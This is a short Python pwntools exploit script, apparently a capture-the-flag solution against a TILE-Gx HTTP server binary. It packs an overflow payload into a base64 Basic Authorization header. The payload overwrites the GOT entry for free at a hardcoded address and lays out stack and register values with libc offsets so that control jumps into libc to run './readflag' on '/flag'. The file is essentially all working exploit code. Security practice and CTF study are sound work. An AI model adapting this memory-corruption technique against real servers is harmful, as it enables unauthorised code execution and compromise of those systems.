from pwn import *

#r = remote("127.0.0.1", 2333)

def get(d):
    p  = "GET / HTTP/1.1\r\n"
    p += "Host: exploit\r\n"
    p += "Authorization: Basic " + d + "\r\n"
    p += "\r\n"
    print(p)
    # r.send(p)

libc_base = 0x4000880000
heap_base = 0x1020a00

p  = b'a'*0x40
# tile-objdump --dynamic-reloc ./tile | grep free
# 0000000001017110 R_TILEGX_JMP_SLOT  free
p += p64(0x1017110)[:4]
p += b':'
p += p64(libc_base + 0x3fbd8)

p  = p.ljust(0xb8, b'b')
p += p64(0x4000862d10) # tp
p += p64(heap_base + len(p) + 0x10 + 0x30) # sp
p += p64(libc_base + 0x157e30) # lr
p += p64(0) # nop
p += p64(0) # nop

h1 = p64(heap_base + len(p))
p += b"./readflag\x00\x00\x00\x00\x00\x00"
h2 = p64(heap_base + len(p))
p += b"/flag\x00\x00\x00"
hh  = p64(heap_base + len(p))
p += h1
p += h2
p += p64(0)

p += h1 # r0
p += hh # r1
p += p64(0x0) # r2
p += p64(1) # r3
p += p64(1) # r4
p += p64(1) # r5
p += p64(1) # r6
p += p64(1) # r7
p += p64(1) # r8
p += p64(1) # r9
p += p64(0xdeadbeaf) # r10
p += p64(libc_base + 0xeec48) # jr

get(b64e(p))
#r.interactive()
